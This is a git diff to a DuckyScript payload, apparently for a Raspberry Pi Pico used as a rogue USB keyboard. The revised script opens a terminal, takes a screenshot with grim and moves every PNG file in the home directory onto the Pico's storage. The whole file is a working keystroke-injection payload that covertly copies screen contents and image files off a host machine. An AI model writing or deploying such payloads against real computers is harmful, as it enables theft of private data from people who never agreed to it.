@@ -4,17 +4,21 @@ REM If you want to use this then you have to rename it to `payload.dd`
 
 DELAY 1000
 
-PRINTSCREEN
-DELAY 500
-
-REM Saves the screenshot onto the pico
 CTRL ALT t
-DELAY 500
+DELAY 1000
 
+REM Take screenshot with grim, which should be installed by default
+STRING grim $HOME/screenshot.png
+ENTER
+DELAY 1000
+
+
+REM Move taken screenshot onto pico storage
 STRING cd $HOME
+ENTER
 DELAY 500
 
-REM verify these values
-STRING mv *.png /media/$USER/RPI-RP2/
+REM verify these values, the pico in /media might not be called the same.
+STRING mv *.png /media/$USER/CIRCUITPY/
 ENTER
 
